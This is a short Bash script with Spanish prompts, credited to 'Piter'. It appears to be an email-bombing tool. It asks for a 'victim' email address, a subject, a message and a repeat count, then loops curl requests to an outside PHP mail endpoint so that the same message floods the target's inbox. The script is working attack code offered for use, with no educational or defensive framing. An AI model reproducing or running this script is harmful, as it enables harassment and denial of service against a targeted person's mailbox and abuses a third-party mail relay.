clear
echo "Este Script Es Creado Por Piter"
echo "Escriba El Correo Victima"
echo "En vez de poner el arroba, sustituir con '%40'"

read too
echo "Escriba El Asunto"
read asu
echo "Escriba El Mensaje"
read msg

echo "Cantidad De Veces Que Quieres Enviar"
read cont

curl -i "https://pitersk.com/piter/mail.php?correo=$too&asunto=$asu&mensaje=$msg"


x=1
while [ $x -le $cont ]
do
curl -i "https://pitersk.com/piter/mail.php?correo=$too&asunto=$asu&mensaje=$msg"

  echo "Correo Numero $x Enviado"
  x=$(( $x + 1 ))
  
done
